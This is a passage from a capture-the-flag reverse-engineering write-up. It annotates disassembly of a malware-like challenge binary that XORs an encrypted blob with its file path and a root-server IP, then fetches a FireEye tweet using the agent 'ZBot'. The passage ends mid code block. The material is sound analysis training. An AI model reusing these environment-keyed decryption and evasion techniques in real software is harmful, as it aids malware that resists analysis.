<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B6F</span> <span style="color: #268BD2">add</span>     <span style="color: #B58900">eax</span><span style="color: #93A1A1">,</span> <span style="color: #B58900">eax</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B71</span> <span style="color: #268BD2">mov</span>     <span style="color: #B58900">edx</span><span style="color: #93A1A1">,</span> <span style="color: #B58900">ecx</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B73</span> <span style="color: #268BD2">sub</span>     <span style="color: #B58900">edx</span><span style="color: #93A1A1">,</span> <span style="color: #B58900">eax</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B75</span> <span style="color: #268BD2">mov</span>     <span style="color: #B58900">al</span><span style="color: #93A1A1">,</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">edx</span><span style="color: #719e07">+</span><span style="color: #B58900">edi</span><span style="color: #93A1A1">]</span>    <span style="color: #586E75">; Moving full path to al by character</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B78</span> <span style="color: #268BD2">xor</span>     <span style="color: #B58900">bl</span><span style="color: #268BD2">ob</span><span style="color: #93A1A1">[</span><span style="color: #B58900">ecx</span><span style="color: #93A1A1">],</span> <span style="color: #B58900">al</span>    <span style="color: #586E75">; xor-ing full path with blob</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B7E</span> <span style="color: #268BD2">inc</span>     <span style="color: #B58900">ecx</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B7F</span> <span style="color: #268BD2">cmp</span>     <span style="color: #B58900">ecx</span><span style="color: #93A1A1">,</span> <span style="color: #B58900">ebx</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B81</span> <span style="color: #268BD2">jb</span>      <span style="color: #268BD2">short</span> <span style="color: #268BD2">loc_401B60</span> <span style="color: #586E75">; jump back up to xor the next char</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B83</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B83</span> <span style="color: #268BD2">loc_401B83</span><span style="color: #93A1A1">:</span>                             <span style="color: #586E75">; CODE XREF: .text:00401B58j</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B83</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">sub_4017A0</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B88</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">sub_4018A0</span>
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<p>We finished the first 10 functions, YAY. Now we see that the full path of binary is xor-ed with the blob. However, <strong>keep in mind that one of the checks compared full path with <code>backdoge.exe</code></strong>.</p>

<p>


    

<figure class="code">
  <figcaption>
  	<span>Fullpath xor</span>
  </figcaption>
  <div class="codewrapper"> 
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%">1</pre></div></td><td class="code"><div class="highlight" style="background: #002B36"><pre style="line-height: 125%"><span style="color: #93A1A1">blob</span> <span style="color: #719e07">=</span> <span style="color: #93A1A1">xor(blob,</span> <span style="color: #93A1A1">fullpath)</span>
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<h4 id="function-13-internet-rootz:94bf06dd1bee42f6b34a1ff79274f7e7">Function 13 - Internet Rootz</h4>

<p>


    

<figure class="code">
  <figcaption>
  	<span></span>
  </figcaption>
  <div class="codewrapper"> 
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%">1
2
3
4
5
6</pre></div></td><td class="code"><div class="highlight" style="background: #002B36"><pre style="line-height: 125%"><span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B83</span> <span style="color: #268BD2">loc_401B83</span><span style="color: #93A1A1">:</span>                             <span style="color: #586E75">; CODE XREF: .text:00401B58j</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B83</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">sub_4017A0</span>       <span style="color: #586E75">; you are here</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B88</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">sub_4018A0</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B8D</span> <span style="color: #268BD2">mov</span>     <span style="color: #B58900">ecx</span><span style="color: #93A1A1">,</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">esi</span><span style="color: #719e07">+</span><span style="color: #2AA198">4</span><span style="color: #93A1A1">]</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B90</span> <span style="color: #268BD2">movzx</span>   <span style="color: #B58900">edx</span><span style="color: #93A1A1">,</span> <span style="color: #DC322F">byte</span> <span style="color: #268BD2">ptr</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">ecx</span><span style="color: #93A1A1">]</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B93</span> <span style="color: #268BD2">mov</span>     <span style="color: #B58900">bl</span><span style="color: #268BD2">ob</span><span style="color: #93A1A1">,</span> <span style="color: #B58900">dl</span>
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<p>Two more functions. We&rsquo;re getting there.</p>

<p><img src="/images/2014/flare/7-19.jpg" alt="Fetching IP for e.root-servers.net" title="Fetching IP for e.root-servers.net" /></p>

<p>We have seen this type of code. This function pushes <code>e.root-servers.net</code> to stack and then calls <code>gethostbyname</code> to retrieve its IP <code>192.203.230.10</code>. If the result is not zero, <code>h_addrtype</code> is checked for 2 (<code>AF_INET</code>) and retrieved IP is converted into ASCII format.</p>

<p><img src="/images/2014/flare/7-20.jpg" alt="xor-ing IP with blob" title="xor-ing IP with blob" /></p>

<p>The rest is pretty simple. <code>192.203.230.10</code> is xor-ed with the blob.</p>

<p>


    

<figure class="code">
  <figcaption>
  	<span>Fullpath xor</span>
  </figcaption>
  <div class="codewrapper"> 
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%">1</pre></div></td><td class="code"><div class="highlight" style="background: #002B36"><pre style="line-height: 125%"><span style="color: #93A1A1">blob</span> <span style="color: #719e07">=</span> <span style="color: #93A1A1">xor(blob,</span><span style="color: #2AA198">&quot;192.203.230.10&quot;</span><span style="color: #93A1A1">)</span>
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<h4 id="function-14-jackrat:94bf06dd1bee42f6b34a1ff79274f7e7">Function 14 - jackRAT</h4>

<p>


    

<figure class="code">
  <figcaption>
  	<span></span>
  </figcaption>
  <div class="codewrapper"> 
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%">1
2
3
4
5
6</pre></div></td><td class="code"><div class="highlight" style="background: #002B36"><pre style="line-height: 125%"><span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B83</span> <span style="color: #268BD2">loc_401B83</span><span style="color: #93A1A1">:</span>                             <span style="color: #586E75">; CODE XREF: .text:00401B58j</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B83</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">InternetRootz</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B88</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">sub_4018A0</span>       <span style="color: #586E75">; you are here</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B8D</span> <span style="color: #268BD2">mov</span>     <span style="color: #B58900">ecx</span><span style="color: #93A1A1">,</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">esi</span><span style="color: #719e07">+</span><span style="color: #2AA198">4</span><span style="color: #93A1A1">]</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B90</span> <span style="color: #268BD2">movzx</span>   <span style="color: #B58900">edx</span><span style="color: #93A1A1">,</span> <span style="color: #DC322F">byte</span> <span style="color: #268BD2">ptr</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">ecx</span><span style="color: #93A1A1">]</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B93</span> <span style="color: #268BD2">mov</span>     <span style="color: #B58900">bl</span><span style="color: #268BD2">ob</span><span style="color: #93A1A1">,</span> <span style="color: #B58900">dl</span>
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<p>


    

<figure class="code">
  <figcaption>
  	<span>sub_4018A0</span>
  </figcaption>
  <div class="codewrapper"> 
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%"> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29</pre></div></td><td class="code"><div class="highlight" style="background: #002B36"><pre style="line-height: 125%"><span style="color: #93A1A1">.text:004018</span><span style="color: #268BD2">A0</span> <span style="color: #268BD2">sub_4018A0</span> <span style="color: #268BD2">proc</span> <span style="color: #268BD2">near</span>
<span style="color: #93A1A1">.text:004018</span><span style="color: #268BD2">A0</span>
<span style="color: #93A1A1">.text:004018</span><span style="color: #268BD2">A0</span> <span style="color: #268BD2">push</span>    <span style="color: #B58900">ebp</span>
<span style="color: #93A1A1">.text:004018</span><span style="color: #268BD2">A1</span> <span style="color: #268BD2">mov</span>     <span style="color: #B58900">ebp</span><span style="color: #93A1A1">,</span> <span style="color: #B58900">esp</span>
<span style="color: #93A1A1">.text:004018</span><span style="color: #268BD2">A3</span> <span style="color: #268BD2">mov</span>     <span style="color: #B58900">eax</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">1088h</span>
<span style="color: #93A1A1">.text:004018</span><span style="color: #268BD2">A8</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">__alloca_probe</span>
<span style="color: #93A1A1">.text:004018</span><span style="color: #268BD2">AD</span> <span style="color: #268BD2">mov</span>     <span style="color: #B58900">eax</span><span style="color: #93A1A1">,</span> <span style="color: #268BD2">___security_cookie</span>
<span style="color: #93A1A1">.text:004018</span><span style="color: #268BD2">B2</span> <span style="color: #268BD2">xor</span>     <span style="color: #B58900">eax</span><span style="color: #93A1A1">,</span> <span style="color: #B58900">ebp</span>
<span style="color: #93A1A1">.text:004018</span><span style="color: #268BD2">B4</span> <span style="color: #268BD2">mov</span>     <span style="color: #93A1A1">[</span><span style="color: #B58900">ebp</span><span style="color: #719e07">+</span><span style="color: #268BD2">var_4</span><span style="color: #93A1A1">],</span> <span style="color: #B58900">eax</span>
<span style="color: #93A1A1">.text:004018</span><span style="color: #268BD2">B7</span> <span style="color: #268BD2">push</span>    <span style="color: #B58900">ebx</span>
<span style="color: #93A1A1">.text:004018</span><span style="color: #268BD2">B8</span> <span style="color: #268BD2">xor</span>     <span style="color: #B58900">ebx</span><span style="color: #93A1A1">,</span> <span style="color: #B58900">ebx</span>
<span style="color: #93A1A1">.text:004018</span><span style="color: #268BD2">BA</span> <span style="color: #268BD2">push</span>    <span style="color: #B58900">ebx</span>             <span style="color: #586E75">; dwFlags - 0x00</span>
<span style="color: #93A1A1">.text:004018</span><span style="color: #268BD2">BB</span> <span style="color: #268BD2">push</span>    <span style="color: #B58900">ebx</span>             <span style="color: #586E75">; lpszProxyBypass - 0x00</span>
<span style="color: #93A1A1">.text:004018</span><span style="color: #268BD2">BC</span> <span style="color: #268BD2">push</span>    <span style="color: #B58900">ebx</span>             <span style="color: #586E75">; lpszProxy - 0x00</span>
<span style="color: #93A1A1">.text:004018</span><span style="color: #268BD2">BD</span> <span style="color: #268BD2">push</span>    <span style="color: #2AA198">1</span>               <span style="color: #586E75">; dwAccessType - INTERNET_OPEN_TYPE_DIRECT</span>
<span style="color: #93A1A1">.text:004018</span><span style="color: #268BD2">BD</span>                         <span style="color: #586E75">; Meaning direct access</span>
<span style="color: #93A1A1">.text:004018</span><span style="color: #268BD2">BF</span> <span style="color: #268BD2">push</span>    <span style="color: #268BD2">offset</span> <span style="color: #268BD2">szAgent</span>  <span style="color: #586E75">; &quot;ZBot&quot;</span>
<span style="color: #93A1A1">.text:004018</span><span style="color: #268BD2">C4</span> <span style="color: #268BD2">call</span>    <span style="color: #B58900">ds</span><span style="color: #93A1A1">:</span><span style="color: #268BD2">InternetOpenW</span>
<span style="color: #93A1A1">.text:004018</span><span style="color: #268BD2">CA</span> <span style="color: #268BD2">mov</span>     <span style="color: #93A1A1">[</span><span style="color: #B58900">ebp</span><span style="color: #719e07">+</span><span style="color: #268BD2">var_1088</span><span style="color: #93A1A1">],</span> <span style="color: #B58900">eax</span>
<span style="color: #93A1A1">.text:004018</span><span style="color: #268BD2">D0</span> <span style="color: #268BD2">cmp</span>     <span style="color: #B58900">eax</span><span style="color: #93A1A1">,</span> <span style="color: #B58900">ebx</span>          <span style="color: #586E75">; If a NULL handle is returned (no internet connectivity) exit</span>
<span style="color: #93A1A1">.text:004018</span><span style="color: #268BD2">D2</span> <span style="color: #268BD2">jnz</span>     <span style="color: #268BD2">short</span> <span style="color: #268BD2">loc_4018E5</span>  <span style="color: #586E75">; otherwise jump to loc_4018E5</span>
<span style="color: #93A1A1">.text:004018</span><span style="color: #268BD2">D4</span> <span style="color: #268BD2">xor</span>     <span style="color: #B58900">eax</span><span style="color: #93A1A1">,</span> <span style="color: #B58900">eax</span>
<span style="color: #93A1A1">.text:004018</span><span style="color: #268BD2">D6</span> <span style="color: #268BD2">pop</span>     <span style="color: #B58900">ebx</span>
<span style="color: #93A1A1">.text:004018</span><span style="color: #268BD2">D7</span> <span style="color: #268BD2">mov</span>     <span style="color: #B58900">ecx</span><span style="color: #93A1A1">,</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">ebp</span><span style="color: #719e07">+</span><span style="color: #268BD2">var_4</span><span style="color: #93A1A1">]</span>
<span style="color: #93A1A1">.text:004018</span><span style="color: #268BD2">DA</span> <span style="color: #268BD2">xor</span>     <span style="color: #B58900">ecx</span><span style="color: #93A1A1">,</span> <span style="color: #B58900">ebp</span>
<span style="color: #93A1A1">.text:004018</span><span style="color: #268BD2">DC</span> <span style="color: #268BD2">call</span>    <span style="color: #93A1A1">@</span><span style="color: #268BD2">__security_check_cookie@4</span> <span style="color: #586E75">; __security_check_cookie(x)</span>
<span style="color: #93A1A1">.text:004018</span><span style="color: #268BD2">E1</span> <span style="color: #268BD2">mov</span>     <span style="color: #B58900">esp</span><span style="color: #93A1A1">,</span> <span style="color: #B58900">ebp</span>
<span style="color: #93A1A1">.text:004018</span><span style="color: #268BD2">E3</span> <span style="color: #268BD2">pop</span>     <span style="color: #B58900">ebp</span>             <span style="color: #586E75">; exit if NULL handle was retured</span>
<span style="color: #93A1A1">.text:004018</span><span style="color: #268BD2">E4</span> <span style="color: #268BD2">ret</span>
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<p>We see <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/aa385096%28v=vs.85%29.aspx" target="_blank">InternetOpen</a> called. This function initialises the WinINet functions. Agent name is <code>ZBot</code> which is an alternate name for the <code>Zeus</code> trojan horse. Access type is <code>INTERNET_OPEN_TYPE_DIRECT</code> which means direct access without the use of any proxies. If a NULL handle is returned then function will exit (line 28). If not it will jump to <code>loc_4018E5</code> (line 21).</p>

<p>


    

<figure class="code">
  <figcaption>
  	<span>loc 4018E5 - InternetOpenUrl</span>
  </figcaption>
  <div class="codewrapper"> 
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%"> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39</pre></div></td><td class="code"><div class="highlight" style="background: #002B36"><pre style="line-height: 125%"><span style="color: #93A1A1">.text:004018</span><span style="color: #268BD2">E5</span> <span style="color: #268BD2">loc_4018E5</span><span style="color: #93A1A1">:</span>             <span style="color: #586E75">; dwContext</span>
<span style="color: #93A1A1">.text:004018</span><span style="color: #268BD2">E5</span> <span style="color: #268BD2">push</span>    <span style="color: #B58900">ebx</span>
<span style="color: #93A1A1">.text:004018</span><span style="color: #268BD2">E6</span> <span style="color: #268BD2">push</span>    <span style="color: #2AA198">400100h</span>         <span style="color: #586E75">; dwFlags</span>
<span style="color: #93A1A1">.text:004018</span><span style="color: #268BD2">EB</span> <span style="color: #268BD2">push</span>    <span style="color: #B58900">ebx</span>             <span style="color: #586E75">; dwHeadersLength - 0x00</span>
<span style="color: #93A1A1">.text:004018</span><span style="color: #268BD2">EC</span> <span style="color: #268BD2">push</span>    <span style="color: #B58900">ebx</span>             <span style="color: #586E75">; lpszHeaders - 0x00</span>
<span style="color: #93A1A1">.text:004018</span><span style="color: #268BD2">ED</span> <span style="color: #268BD2">lea</span>     <span style="color: #B58900">ecx</span><span style="color: #93A1A1">,</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">ebp</span><span style="color: #719e07">+</span><span style="color: #268BD2">szUrl</span><span style="color: #93A1A1">]</span>
<span style="color: #93A1A1">.text:004018</span><span style="color: #268BD2">F0</span> <span style="color: #268BD2">push</span>    <span style="color: #B58900">ecx</span>             <span style="color: #586E75">; lpszUrl</span>
<span style="color: #93A1A1">.text:004018</span><span style="color: #268BD2">F1</span> <span style="color: #268BD2">push</span>    <span style="color: #B58900">eax</span>             <span style="color: #586E75">; hInternet - Handle from previous InternetOpen</span>
<span style="color: #93A1A1">.text:004018</span><span style="color: #268BD2">F2</span> <span style="color: #268BD2">mov</span>     <span style="color: #DC322F">dword</span> <span style="color: #268BD2">ptr</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">ebp</span><span style="color: #719e07">+</span><span style="color: #268BD2">szUrl</span><span style="color: #93A1A1">],</span> <span style="color: #2AA198">740068h</span>
<span style="color: #93A1A1">.text:004018</span><span style="color: #268BD2">F9</span> <span style="color: #268BD2">mov</span>     <span style="color: #93A1A1">[</span><span style="color: #B58900">ebp</span><span style="color: #719e07">+</span><span style="color: #268BD2">var_78</span><span style="color: #93A1A1">],</span> <span style="color: #2AA198">700074h</span>
<span style="color: #93A1A1">.text:00401900</span> <span style="color: #268BD2">mov</span>     <span style="color: #93A1A1">[</span><span style="color: #B58900">ebp</span><span style="color: #719e07">+</span><span style="color: #268BD2">var_74</span><span style="color: #93A1A1">],</span> <span style="color: #2AA198">3A0073h</span>
<span style="color: #93A1A1">.text:00401907</span> <span style="color: #268BD2">mov</span>     <span style="color: #93A1A1">[</span><span style="color: #B58900">ebp</span><span style="color: #719e07">+</span><span style="color: #268BD2">var_70</span><span style="color: #93A1A1">],</span> <span style="color: #2AA198">2F002Fh</span>
<span style="color: #93A1A1">.text:0040190</span><span style="color: #268BD2">E</span> <span style="color: #268BD2">mov</span>     <span style="color: #93A1A1">[</span><span style="color: #B58900">ebp</span><span style="color: #719e07">+</span><span style="color: #268BD2">var_6C</span><span style="color: #93A1A1">],</span> <span style="color: #2AA198">770074h</span>
<span style="color: #93A1A1">.text:00401915</span> <span style="color: #268BD2">mov</span>     <span style="color: #93A1A1">[</span><span style="color: #B58900">ebp</span><span style="color: #719e07">+</span><span style="color: #268BD2">var_68</span><span style="color: #93A1A1">],</span> <span style="color: #2AA198">740069h</span>
<span style="color: #93A1A1">.text:0040191</span><span style="color: #268BD2">C</span> <span style="color: #268BD2">mov</span>     <span style="color: #93A1A1">[</span><span style="color: #B58900">ebp</span><span style="color: #719e07">+</span><span style="color: #268BD2">var_64</span><span style="color: #93A1A1">],</span> <span style="color: #2AA198">650074h</span>
<span style="color: #93A1A1">.text:00401923</span> <span style="color: #268BD2">mov</span>     <span style="color: #93A1A1">[</span><span style="color: #B58900">ebp</span><span style="color: #719e07">+</span><span style="color: #268BD2">var_60</span><span style="color: #93A1A1">],</span> <span style="color: #2AA198">2E0072h</span>
<span style="color: #93A1A1">.text:0040192</span><span style="color: #268BD2">A</span> <span style="color: #268BD2">mov</span>     <span style="color: #93A1A1">[</span><span style="color: #B58900">ebp</span><span style="color: #719e07">+</span><span style="color: #268BD2">var_5C</span><span style="color: #93A1A1">],</span> <span style="color: #2AA198">6F0063h</span>
<span style="color: #93A1A1">.text:00401931</span> <span style="color: #268BD2">mov</span>     <span style="color: #93A1A1">[</span><span style="color: #B58900">ebp</span><span style="color: #719e07">+</span><span style="color: #268BD2">var_58</span><span style="color: #93A1A1">],</span> <span style="color: #2AA198">2F006Dh</span>
<span style="color: #93A1A1">.text:00401938</span> <span style="color: #268BD2">mov</span>     <span style="color: #93A1A1">[</span><span style="color: #B58900">ebp</span><span style="color: #719e07">+</span><span style="color: #268BD2">var_54</span><span style="color: #93A1A1">],</span> <span style="color: #2AA198">690046h</span>
<span style="color: #93A1A1">.text:0040193</span><span style="color: #268BD2">F</span> <span style="color: #268BD2">mov</span>     <span style="color: #93A1A1">[</span><span style="color: #B58900">ebp</span><span style="color: #719e07">+</span><span style="color: #268BD2">var_50</span><span style="color: #93A1A1">],</span> <span style="color: #2AA198">650072h</span>
<span style="color: #93A1A1">.text:00401946</span> <span style="color: #268BD2">mov</span>     <span style="color: #93A1A1">[</span><span style="color: #B58900">ebp</span><span style="color: #719e07">+</span><span style="color: #268BD2">var_4C</span><span style="color: #93A1A1">],</span> <span style="color: #2AA198">790045h</span>
<span style="color: #93A1A1">.text:0040194</span><span style="color: #268BD2">D</span> <span style="color: #268BD2">mov</span>     <span style="color: #93A1A1">[</span><span style="color: #B58900">ebp</span><span style="color: #719e07">+</span><span style="color: #268BD2">var_48</span><span style="color: #93A1A1">],</span> <span style="color: #2AA198">2F0065h</span>
<span style="color: #93A1A1">.text:00401954</span> <span style="color: #268BD2">mov</span>     <span style="color: #93A1A1">[</span><span style="color: #B58900">ebp</span><span style="color: #719e07">+</span><span style="color: #268BD2">var_44</span><span style="color: #93A1A1">],</span> <span style="color: #2AA198">740073h</span>
<span style="color: #93A1A1">.text:0040195</span><span style="color: #268BD2">B</span> <span style="color: #268BD2">mov</span>     <span style="color: #93A1A1">[</span><span style="color: #B58900">ebp</span><span style="color: #719e07">+</span><span style="color: #268BD2">var_40</span><span style="color: #93A1A1">],</span> <span style="color: #2AA198">740061h</span>
<span style="color: #93A1A1">.text:00401962</span> <span style="color: #268BD2">mov</span>     <span style="color: #93A1A1">[</span><span style="color: #B58900">ebp</span><span style="color: #719e07">+</span><span style="color: #268BD2">var_3C</span><span style="color: #93A1A1">],</span> <span style="color: #2AA198">730075h</span>
<span style="color: #93A1A1">.text:00401969</span> <span style="color: #268BD2">mov</span>     <span style="color: #93A1A1">[</span><span style="color: #B58900">ebp</span><span style="color: #719e07">+</span><span style="color: #268BD2">var_38</span><span style="color: #93A1A1">],</span> <span style="color: #2AA198">34002Fh</span>
<span style="color: #93A1A1">.text:00401970</span> <span style="color: #268BD2">mov</span>     <span style="color: #93A1A1">[</span><span style="color: #B58900">ebp</span><span style="color: #719e07">+</span><span style="color: #268BD2">var_34</span><span style="color: #93A1A1">],</span> <span style="color: #2AA198">340038h</span>
<span style="color: #93A1A1">.text:00401977</span> <span style="color: #268BD2">mov</span>     <span style="color: #93A1A1">[</span><span style="color: #B58900">ebp</span><span style="color: #719e07">+</span><span style="color: #268BD2">var_30</span><span style="color: #93A1A1">],</span> <span style="color: #2AA198">330030h</span>
<span style="color: #93A1A1">.text:0040197</span><span style="color: #268BD2">E</span> <span style="color: #268BD2">mov</span>     <span style="color: #93A1A1">[</span><span style="color: #B58900">ebp</span><span style="color: #719e07">+</span><span style="color: #268BD2">var_2C</span><span style="color: #93A1A1">],</span> <span style="color: #2AA198">350033h</span>
<span style="color: #93A1A1">.text:00401985</span> <span style="color: #268BD2">mov</span>     <span style="color: #93A1A1">[</span><span style="color: #B58900">ebp</span><span style="color: #719e07">+</span><span style="color: #268BD2">var_28</span><span style="color: #93A1A1">],</span> <span style="color: #2AA198">350031h</span>
<span style="color: #93A1A1">.text:0040198</span><span style="color: #268BD2">C</span> <span style="color: #268BD2">mov</span>     <span style="color: #93A1A1">[</span><span style="color: #B58900">ebp</span><span style="color: #719e07">+</span><span style="color: #268BD2">var_24</span><span style="color: #93A1A1">],</span> <span style="color: #2AA198">330035h</span>
<span style="color: #93A1A1">.text:00401993</span> <span style="color: #268BD2">mov</span>     <span style="color: #93A1A1">[</span><span style="color: #B58900">ebp</span><span style="color: #719e07">+</span><span style="color: #268BD2">var_20</span><span style="color: #93A1A1">],</span> <span style="color: #2AA198">310038h</span>
<span style="color: #93A1A1">.text:0040199</span><span style="color: #268BD2">A</span> <span style="color: #268BD2">mov</span>     <span style="color: #93A1A1">[</span><span style="color: #B58900">ebp</span><span style="color: #719e07">+</span><span style="color: #268BD2">var_1C</span><span style="color: #93A1A1">],</span> <span style="color: #2AA198">360031h</span>
<span style="color: #93A1A1">.text:004019</span><span style="color: #268BD2">A1</span> <span style="color: #268BD2">mov</span>     <span style="color: #93A1A1">[</span><span style="color: #B58900">ebp</span><span style="color: #719e07">+</span><span style="color: #268BD2">var_18</span><span style="color: #93A1A1">],</span> <span style="color: #2AA198">300036h</span>
<span style="color: #93A1A1">.text:004019</span><span style="color: #268BD2">A8</span> <span style="color: #268BD2">mov</span>     <span style="color: #93A1A1">[</span><span style="color: #B58900">ebp</span><span style="color: #719e07">+</span><span style="color: #268BD2">var_14</span><span style="color: #93A1A1">],</span> <span style="color: #2AA198">38h</span>   <span style="color: #586E75">; https://twitter.com/FireEye/status/484033515538116608</span>
<span style="color: #93A1A1">.text:004019</span><span style="color: #268BD2">AF</span> <span style="color: #268BD2">call</span>    <span style="color: #B58900">ds</span><span style="color: #93A1A1">:</span><span style="color: #268BD2">InternetOpenUrlW</span> <span style="color: #586E75">; open URL</span>
<span style="color: #93A1A1">.text:004019</span><span style="color: #268BD2">B5</span> <span style="color: #268BD2">mov</span>     <span style="color: #93A1A1">[</span><span style="color: #B58900">ebp</span><span style="color: #719e07">+</span><span style="color: #268BD2">hInternet</span><span style="color: #93A1A1">],</span> <span style="color: #B58900">eax</span>
<span style="color: #93A1A1">.text:004019</span><span style="color: #268BD2">BB</span> <span style="color: #268BD2">cmp</span>     <span style="color: #B58900">eax</span><span style="color: #93A1A1">,</span> <span style="color: #B58900">ebx</span>        <span style="color: #586E75">; ebx == 0x00 - check if eax is zero</span>
<span style="color: #93A1A1">.text:004019</span><span style="color: #268BD2">BD</span> <span style="color: #268BD2">jz</span>      <span style="color: #268BD2">loc_4018D4</span>      <span style="color: #586E75">; if (eax == 0 ) jump to loc_4018D4 (return immedi</span>
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<p><a href="http://msdn.microsoft.com/en-us/library/windows/desktop/aa385098%28v=vs.85%29.aspx" target="_blank">InternetOpenUrl</a> opens a handle to a resource. <code>dwFlags</code> is set to <code>0x00400100</code>. I could not find the exact meaning of this flag value. However, according to <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/aa383661%28v=vs.85%29.aspx" target="_blank">this page</a> it could be the <code>OR</code> of two flags (does it work that way?):</p>

<p>


    

<figure class="code">
  <figcaption>
  	<span>0x00400100 flag</span>
  </figcaption>
  <div class="codewrapper"> 
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%">1
2
3
4
5</pre></div></td><td class="code"><div class="highlight" style="background: #002B36"><pre style="line-height: 125%"><span style="color: #93A1A1">INTERNET_FLAG_KEEP_CONNECTION:</span> <span style="color: #93A1A1">0x00400000</span>
<span style="color: #93A1A1">Uses</span> <span style="color: #93A1A1">keep-alive</span> <span style="color: #93A1A1">semantics,</span> <span style="color: #719e07">if</span> <span style="color: #93A1A1">available,</span> <span style="color: #719e07">for</span> <span style="color: #93A1A1">the</span> <span style="color: #93A1A1">connection.</span>

<span style="color: #93A1A1">INTERNET_FLAG_PRAGMA_NOCACHE:</span> <span style="color: #93A1A1">0x00000100</span>
<span style="color: #93A1A1">Forces</span> <span style="color: #93A1A1">the</span> <span style="color: #93A1A1">request</span> <span style="color: #93A1A1">to</span> <span style="color: #93A1A1">be</span> <span style="color: #93A1A1">resolved</span> <span style="color: #93A1A1">by</span> <span style="color: #93A1A1">the</span> <span style="color: #93A1A1">origin</span> <span style="color: #93A1A1">server.</span>
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<p>Lines 9 to 35 are saving the URL, we know what it is without even looking at it. We have seen it in Wireshark before. The URL is <code>https://twitter.com/FireEye/status/484033515538116608</code>.</p>

<!-- ![Fireeye tweet](/images/2014/flare/7-2.jpg "Fireeye tweet") -->

<p><blockquote class="twitter-tweet"><p lang="en" dir="ltr">The Service You Can’t Refuse: A Secluded HijackRAT <a href="http://t.co/ckx18JHdkb">http://t.co/ckx18JHdkb</a> <a href="https://twitter.com/hashtag/infosec?src=hash">#infosec</a> <a href="https://twitter.com/hashtag/malware?src=hash">#malware</a></p>&mdash; FireEye (@FireEye) <a href="https://twitter.com/FireEye/status/484033515538116608">July 1, 2014</a></blockquote>
<script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script></p>

<p>Line 37 saves return value which is a &ldquo;valid handle to the URL if the connection is successfully established, or NULL if the connection fails&rdquo;. Then it is checked for being NULL, if so we will jump to <code>loc_4018D4</code> and function returns immediately. If we have a handle to the tweet, execution continues.</p>

<p>


    

<figure class="code">
  <figcaption>
  	<span>loc 4019D6 - InternetReadFile</span>
  </figcaption>
  <div class="codewrapper"> 
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%"> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
